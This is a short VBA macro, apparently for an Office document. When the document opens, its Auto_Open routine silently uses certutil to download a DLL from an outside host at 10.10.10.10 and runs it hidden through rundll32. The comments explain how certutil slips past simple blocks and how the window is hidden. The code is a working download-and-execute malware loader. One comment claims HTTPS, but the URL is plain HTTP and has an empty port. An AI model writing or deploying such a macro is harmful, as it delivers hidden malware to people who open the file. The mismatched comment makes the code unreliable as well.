Sub Auto_Open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    Dim payloadURL As String
    Dim dropPath As String
    Dim downloadCmd As String
    Dim execCommand As String
    
    ' 1. Define paths - Using quotes to handle potential spaces in paths
    payloadURL = "http://10.10.10.10:/Shqiponja.dll" ' Updated to HTTPS to match your server
    dropPath = """" & Environ("TEMP") & "\run.dll" & """"
    
    ' 2. Use certutil to download. -urlcache -f -split is the standard way to bypass simple blocks.
    downloadCmd = "certutil.exe -urlcache -f -split " & payloadURL & " " & dropPath
    
    ' 3. Execution command. We use 'start' to ensure rundll32 detaches from the CMD window immediately.
    ' Note: No space between the comma and function name in rundll32.
    execCommand = "cmd.exe /c " & downloadCmd & " && start /b rundll32.exe " & dropPath & ",StartHeartbeat"
    
    ' 4. Run the combined command hidden (0)
    ' False means 'Do not wait for completion'
    shell.Run execCommand, 0, False
End Sub
